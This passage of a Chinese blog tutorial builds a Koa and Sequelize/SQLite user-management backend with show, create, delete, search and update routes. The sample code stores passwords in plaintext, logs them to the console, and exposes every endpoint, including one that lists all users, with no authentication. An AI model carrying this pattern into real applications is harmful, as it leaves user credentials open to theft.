class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化 node.js 项目</span></span><br><span class="line"><span class="built_in">mkdir</span> example</span><br><span class="line"><span class="built_in">cd</span> example</span><br><span class="line">yarn init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 koa</span></span><br><span class="line">yarn add -D koa</span><br></pre></td></tr></table></figure><h2 id="init-ping"><a href="#init-ping" class="headerlink" title="init &amp; ping"></a>init &amp; ping</h2><p>该部分参考：<a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023025933764960">处理 URL - 廖雪峰的官方网站</a>。这个文章会告诉你如何搭建一个基础的 koa 服务，并编写一个 <code>/ping</code> api 进行示范。</p><p>你需要先安装一些依赖库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add -D koa-router require-directory</span><br></pre></td></tr></table></figure><p><code>koa-router</code> 是一个用于 koa 框架的路由中间件，它提供了类似于 Express 的路由功能（例如 app.get、app.put、app.post 等）。它支持命名 URL 参数、命名路由与 URL 生成、匹配特定主机的路由、响应带有允许方法的 OPTIONS 请求、支持 405 方法不允许和 501 未实现等特性。</p><p><code>require-directory</code> 可以递归地遍历指定目录，使用 <code>require()</code> 加载每个文件，并返回包含这些模块的嵌套哈希结构。它可以用来自动加载目录中的所有模块，而不需要手动一个一个地加载（似乎只适配 Common JS）。</p><p>完成以下代码，你能实现一个最基本的 koa 后端服务，当你访问 <a href="http://localhost:3000/ping">http://localhost:3000/ping</a> 时能得到一个 <code>pong!</code> 响应。</p><p>先来看看目录结构：</p><div align='center'>    <img style='height:200px' src='https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230828220513695.png' /></div><p><code>/core/init.js</code> 文件用于初始化 &#x2F;api&#x2F; 目录下所有 api 接口文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> requireDirectory = <span class="built_in">require</span>(<span class="string">&#x27;require-directory&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InitManager</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">initCore</span>(<span class="params">app</span>) &#123;</span><br><span class="line">        <span class="title class_">InitManager</span>.<span class="property">app</span> = app;</span><br><span class="line">        <span class="title class_">InitManager</span>.<span class="title function_">initLoadRouters</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">initLoadRouters</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">whenLoadModule</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="title class_">Router</span>) &#123;</span><br><span class="line">                <span class="title class_">InitManager</span>.<span class="property">app</span>.<span class="title function_">use</span>(obj.<span class="title function_">routes</span>())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> apiDirectory = <span class="string">`<span class="subst">$&#123;process.cwd()&#125;</span>/api`</span></span><br><span class="line">        </span><br><span class="line">        <span class="title function_">requireDirectory</span>(<span class="variable language_">module</span>, apiDirectory, &#123;</span><br><span class="line">            <span class="attr">visit</span>: whenLoadModule</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title class_">InitManager</span>;</span><br></pre></td></tr></table></figure><p><code>/api/ping.js</code> 实现了一个简单的后端 api 接口，当用户访问 &#x2F;ping 路由时，后端服务会返回给用户一个 <code>pong!</code> 文本响应：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/ping&#x27;</span>,<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="string">&#x27;pong!&#x27;</span>;</span><br><span class="line">&#125; );</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><code>/app.js</code> 是入口文件，初始化一个 Koa 对象，调用 <code>init.js</code> 启用所有 api 接口，然后监听本地 3000 端口：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">InitManager</span> = <span class="built_in">require</span>(<span class="string">&#x27;./core/init&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Koa</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">InitManager</span>.<span class="title function_">initCore</span>(app);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`🎁 Listening on localhost:3000 ...`</span>);</span><br></pre></td></tr></table></figure><p>完成以上代码后，在项目根目录执行以下指令启动服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node app.js</span><br></pre></td></tr></table></figure><h2 id="database"><a href="#database" class="headerlink" title="database"></a>database</h2><p>先安装一些依赖库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add -D sqlite3 sequelize</span><br></pre></td></tr></table></figure><p><code>sequelize</code> 是一个基于 promise 的 Node.js ORM（对象关系映射），可用于 PostgresSQL、MySQL、MariaDB、SQLite 和 Microsoft SQL Server 数据库。它提供了一种简单、灵活且强大的方法来定义模型和关系，并支持事务、迁移和复杂查询等高级功能。</p><p>简单的说，就是大家都不想写 Raw SQL，觉得麻烦且存在安全问题，就封装了一套接口用来实现常用的 SQL 语句。</p><p>我们在项目根目录下创建一个 <code>/database/db.js</code>，写入以下内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你不需要手动创建 database.db，若代码检测到对应数据库不存在则会自动创建</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Sequelize</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;sequelize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sequelize = <span class="keyword">new</span> <span class="title class_">Sequelize</span>(&#123;</span><br><span class="line">    <span class="attr">dialect</span>: <span class="string">&#x27;sqlite&#x27;</span>,</span><br><span class="line">    <span class="attr">storage</span>: <span class="string">&#x27;./sqlite.db&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    sequelize.<span class="title function_">authenticate</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Connect to database successfully`</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Connection failed: <span class="subst">$&#123;err&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; sequelize &#125;;</span><br></pre></td></tr></table></figure><h2 id="schema"><a href="#schema" class="headerlink" title="schema"></a>schema</h2><p>我们在项目根目录下创建一个 <code>/schema/user.js</code>，该文件的作用是定义了数据库模型，方便我们在其他文件使用。写入以下内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">DataTypes</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;sequelize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">sequelize</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> sequelize.<span class="title function_">define</span>(<span class="string">&#x27;user&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">id</span>: &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="title class_">DataTypes</span>.<span class="property">INTEGER</span>,</span><br><span class="line">            <span class="attr">primaryKey</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">autoIncrement</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">allowNull</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">field</span>: <span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">username</span>: &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="title class_">DataTypes</span>.<span class="property">TEXT</span>,</span><br><span class="line">            <span class="attr">allowNull</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">field</span>: <span class="string">&#x27;username&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">password</span>: &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="title class_">DataTypes</span>.<span class="property">TEXT</span>,</span><br><span class="line">            <span class="attr">allowNull</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">field</span>: <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="modules"><a href="#modules" class="headerlink" title="modules"></a>modules</h2><p>这段代码定义了一个名为 <code>userModel</code> 的类，它包含了一些静态方法，用于对数据库中的 <code>users</code> 表进行操作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> db = <span class="built_in">require</span>(<span class="string">&#x27;../database/db&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sequelize = db.<span class="property">sequelize</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = <span class="built_in">require</span>(<span class="string">&#x27;../schema/user&#x27;</span>)(sequelize);</span><br><span class="line">user.<span class="title function_">sync</span>(&#123;<span class="attr">force</span>: <span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">userModel</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">async</span> <span class="title function_">showAllUsers</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> users = <span class="keyword">await</span> user.<span class="title function_">findAll</span>();</span><br><span class="line">        <span class="keyword">return</span> users;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">async</span> <span class="title function_">createUser</span>(<span class="params">username, password</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> newUser = <span class="keyword">await</span> user.<span class="title function_">create</span>(&#123;</span><br><span class="line">            username,</span><br><span class="line">            password</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> newUser;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">async</span> <span class="title function_">deleteUser</span>(<span class="params">username</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> user.<span class="title function_">destroy</span>(&#123;</span><br><span class="line">            <span class="attr">where</span>: &#123;</span><br><span class="line">                username</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">async</span> <span class="title function_">searchUser</span>(<span class="params">username</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> user.<span class="title function_">findOne</span>(&#123;</span><br><span class="line">            <span class="attr">where</span>: &#123;</span><br><span class="line">                username</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">async</span> <span class="title function_">updateUser</span>(<span class="params">userId, username, password</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> user.<span class="title function_">update</span>(&#123;</span><br><span class="line">            username,</span><br><span class="line">            password,</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            <span class="attr">where</span>: &#123;</span><br><span class="line">                <span class="attr">id</span>: userId</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = userModel;</span><br></pre></td></tr></table></figure><h2 id="controllers"><a href="#controllers" class="headerlink" title="controllers"></a>controllers</h2><p>这段代码定义了一个名为 <code>userController</code> 的类，它包含了一些静态方法，用于处理与用户相关的 HTTP 请求。</p><p>controllers 中的静态方法与上文提到的 modules 中的静态方法一一对应。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userModel = <span class="built_in">require</span>(<span class="string">&#x27;../modules/user&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">userController</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">async</span> <span class="title function_">show</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> users = <span class="keyword">await</span> userModel.<span class="title function_">showAllUsers</span>();</span><br><span class="line">        ctx.<span class="property">response</span>.<span class="property">status</span> = <span class="number">200</span>;</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">            <span class="attr">data</span>: users</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">async</span> <span class="title function_">create</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> data = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">const</span> username = data.<span class="property">username</span>;</span><br><span class="line">        <span class="keyword">const</span> password = data.<span class="property">password</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(username + <span class="string">&#x27; &#x27;</span> + password);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> newUser = <span class="keyword">await</span> userModel.<span class="title function_">createUser</span>(username, password);</span><br><span class="line">        ctx.<span class="property">response</span>.<span class="property">status</span> = <span class="number">200</span>;</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">            <span class="attr">data</span>: newUser</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">async</span> <span class="title function_">delete</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> data = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">const</span> username = data.<span class="property">username</span>;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> userModel.<span class="title function_">deleteUser</span>(username);</span><br><span class="line">        ctx.<span class="property">response</span>.<span class="property">status</span> = <span class="number">200</span>;</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">            <span class="attr">data</span>: result</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">async</span> <span class="title function_">search</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> data = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">const</span> username = data.<span class="property">username</span>;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> userModel.<span class="title function_">searchUser</span>(username);</span><br><span class="line">        ctx.<span class="property">response</span>.<span class="property">status</span> = <span class="number">200</span>;</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">            <span class="attr">data</span>: result</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">async</span> <span class="title function_">update</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> data = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">const</span> userId = data.<span class="property">userId</span>;</span><br><span class="line">        <span class="keyword">const</span> username = data.<span class="property">username</span>;</span><br><span class="line">        <span class="keyword">const</span> password = data.<span class="property">password</span>;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> userModel.<span class="title function_">updateUser</span>(userId, username, password);</span><br><span class="line">        ctx.<span class="property">response</span>.<span class="property">status</span> = <span class="number">200</span>;</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">            <span class="attr">data</span>: result</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = userController;</span><br></pre></td></tr></table></figure><h2 id="router-api"><a href="#router-api" class="headerlink" title="router&#x2F;api"></a>router&#x2F;api</h2><p>我们为每个接口单独创建一个文件，便于后期维护。每个接口也是对应到 <code>userControllers</code> 类中的静态方法。</p><p><code>/api/show</code> 接口，用于展示当前数据库所有内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> userController = <span class="built_in">require</span>(<span class="string">&#x27;../controllers/user&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/api/show&#x27;</span>, userController.<span class="property">show</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><code>/api/create</code> 接口，用于创建一个新的用户：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> userController = <span class="built_in">require</span>(<span class="string">&#x27;../controllers/user&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/create&#x27;</span>, userController.<span class="property">create</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><code>/api/delete</code> 接口，用于删除一个用户：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> userController = <span class="built_in">require</span>(<span class="string">&#x27;../controllers/user&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/delete&#x27;</span>, userController.<span class="property">delete</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><code>/api/search</code> 接口，用于查找一个用户：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> userController = <span class="built_in">require</span>(<span class="string">&#x27;../controllers/user&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/search&#x27;</span>, userController.<span class="property">search</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><code>/api/update</code> 接口，用于更新一个用户的信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> userController = <span class="built_in">require</span>(<span class="string">&#x27;../controllers/user&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/update&#x27;</span>, userController.<span class="property">update</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><h2 id="bodyparser-cors"><a href="#bodyparser-cors" class="headerlink" title="bodyparser &amp; cors"></a>bodyparser &amp; cors</h2><h3 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h3><p>原生 kao 不支持解析 POST 请求正文数据，也就是说，此时你编写的 body 参数解析代码并不生效！</p><p>就像我们编写的 controllers 部分代码需要解析 POST 请求主体并获取参数，此时并不会生效。比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /controllers/user.js</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">userController</span> &#123;</span><br><span class="line"> ... ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">async</span> <span class="title function_">create</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">        <span class="comment">// 解析 POST 请求主体中的 username &amp; password 参数</span></span><br><span class="line">        <span class="keyword">const</span> data = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">const</span> username = data.<span class="property">username</span>;</span><br><span class="line">        <span class="keyword">const</span> password = data.<span class="property">password</span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ... ...</span><br><span 